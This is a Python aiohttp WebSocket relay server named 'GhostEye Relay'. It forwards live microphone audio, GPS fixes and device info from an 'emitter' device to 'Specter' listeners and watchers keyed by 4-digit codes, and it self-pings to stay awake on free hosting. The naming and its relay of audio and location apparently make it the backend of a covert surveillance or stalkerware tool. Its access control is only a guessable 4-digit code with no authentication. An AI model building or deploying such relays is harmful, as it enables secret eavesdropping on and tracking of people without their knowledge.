import asyncio
import aiohttp
from aiohttp import web
import random
import string
import os

emitters  = {}   # code -> ghosteye ws
listeners = {}   # code -> specter ws (JOIN audio)
watchers  = {}   # code -> set de ws en modo WATCH
last_info = {}   # code -> ultimo INFO recibido

def gen_code():
    while True:
        code = ''.join(random.choices(string.digits, k=4))
        if code not in emitters:
            return code

async def handle_ping(request):
    return web.Response(text="GhostEye Relay OK", status=200)

async def self_ping(app):
    url = os.environ.get("RAILWAY_STATIC_URL", os.environ.get("RENDER_EXTERNAL_URL", ""))
    if not url:
        return
    if not url.startswith("http"):
        url = "https://" + url
    while True:
        await asyncio.sleep(4 * 60)
        try:
            async with aiohttp.ClientSession() as session:
                await session.get(url + "/ping", timeout=aiohttp.ClientTimeout(total=10))
        except Exception:
            pass

async def handle(request):
    # ✅ heartbeat=10 — detecta zombies en 10s
    ws = web.WebSocketResponse(heartbeat=10)
    await ws.prepare(request)
    code = None
    role = None

    try:
        msg = await asyncio.wait_for(ws.receive(), timeout=10)
        if msg.type != aiohttp.WSMsgType.TEXT:
            return ws
        text = msg.data

        # ── GHOSTEYE 2 emisor ──
        if text == "EMIT" or text.startswith("EMIT:"):
            if text.startswith("EMIT:"):
                code = text[5:].strip()
                if not code.isdigit() or len(code) != 4:
                    code = gen_code()
            else:
                code = gen_code()

            role = "EMIT"
            emitters[code] = ws
            if code not in watchers:
                watchers[code] = set()
            await ws.send_str(f"CODE:{code}")

            # ✅ Si Specter ya está esperando — enviar READY inmediatamente
            listener = listeners.get(code)
            if listener and not listener.closed:
                try:
                    await ws.send_str("READY")
                except Exception:
                    pass

            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.BINARY:
                    listener = listeners.get(code)
                    if listener and not listener.closed:
                        try:
                            await listener.send_bytes(msg.data)
                        except Exception:
                            listeners.pop(code, None)

                elif msg.type == aiohttp.WSMsgType.TEXT:
                    txt = msg.data
                    if txt.startswith("INFO|"):
                        last_info[code] = txt
                        # Reenviar al listener
                        listener = listeners.get(code)
                        if listener and not listener.closed:
                            try:
                                await listener.send_str(txt)
                            except Exception:
                                listeners.pop(code, None)
                        # Reenviar a watchers
                        dead = set()
                        for w in list(watchers.get(code, set())):
                            if w.closed:
                                dead.add(w)
                                continue
                            try:
                                await w.send_str(txt)
                            except Exception:
                                dead.add(w)
                        watchers.get(code, set()).difference_update(dead)
                    elif txt.startswith("GPS|"):
                        listener = listeners.get(code)
                        if listener and not listener.closed:
                            try:
                                await listener.send_str(txt)
                            except Exception:
                                listeners.pop(code, None)
                        dead = set()
                        for w in list(watchers.get(code, set())):
                            if w.closed:
                                dead.add(w); continue
                            try:
                                await w.send_str(txt)
                            except Exception:
                                dead.add(w)
                        watchers.get(code, set()).difference_update(dead)
                    else:
                        listener = listeners.get(code)
                        if listener and not listener.closed:
                            try:
                                await listener.send_str(txt)
                            except Exception:
                                listeners.pop(code, None)

                elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                    break

        # ── SPECTER oyente con audio ──
        elif text.startswith("JOIN:"):
            code = text[5:].strip()
            if code not in emitters:
                await ws.send_str("ERROR:INVALID_CODE")
                return ws

            role = "JOIN"

            # ✅ Limpiar listener zombie anterior si existe
            old_listener = listeners.get(code)
            if old_listener and not old_listener.closed:
                try:
                    await old_listener.close()
                except Exception:
                    pass
            listeners[code] = ws
            await ws.send_str("OK")

            # ✅ Enviar READY inmediatamente si emisor está conectado
            emitter = emitters.get(code)
            if emitter and not emitter.closed:
                try:
                    await emitter.send_str("READY")
                except Exception:
                    emitters.pop(code, None)

            # ✅ Enviar último INFO guardado inmediatamente
            if code in last_info:
                try:
                    await ws.send_str(last_info[code])
                except Exception:
                    pass

            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    emitter = emitters.get(code)
                    if emitter and not emitter.closed:
                        try:
                            await emitter.send_str(msg.data)
                        except Exception:
                            emitters.pop(code, None)
                elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                    break

        # ── SPECTER solo info (WATCH) ──
        elif text.startswith("WATCH:"):
            code = text[6:].strip()
            if code not in emitters:
                await ws.send_str("ERROR:INVALID_CODE")
                return ws

            role = "WATCH"
            if code not in watchers:
                watchers[code] = set()
            watchers[code].add(ws)
            await ws.send_str("WATCHING")

            # ✅ Enviar último INFO guardado inmediatamente
            if code in last_info:
                try:
                    await ws.send_str(last_info[code])
                except Exception:
                    pass

            # Pedir info actualizada
            emitter = emitters.get(code)
            if emitter and not emitter.closed:
                try:
                    await emitter.send_str("GET_INFO")
                except Exception:
                    pass

            async for msg in ws:
                if msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                    break

    except Exception as e:
        print(f"Error: {e}")
    finally:
        # ✅ SIEMPRE limpiar al desconectar — elimina zombies
        if role == "EMIT" and code:
            emitters.pop(code, None)
            # Notificar a listener que emisor se fue
            listener = listeners.get(code)
            if listener and not listener.closed:
                try:
                    await listener.send_str("EMITTER_GONE")
                except Exception:
                    pass

        elif role == "JOIN" and code:
            listeners.pop(code, None)
            # Parar micrófono de GhostEye 2
            emitter = emitters.get(code)
            if emitter and not emitter.closed:
                try:
                    await emitter.send_str("STOP")
                except Exception:
                    pass

        elif role == "WATCH" and code:
            if code in watchers:
                watchers[code].discard(ws)

    return ws

async def main():
    port = int(os.environ.get("PORT", 8765))
    app = web.Application()
    app.router.add_get("/", handle)
    app.router.add_get("/ws", handle)
    app.router.add_get("/ping", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    print(f"Relay PRO corriendo en puerto {port}")
    asyncio.ensure_future(self_ping(app))
    await asyncio.Future()

asyncio.run(main())
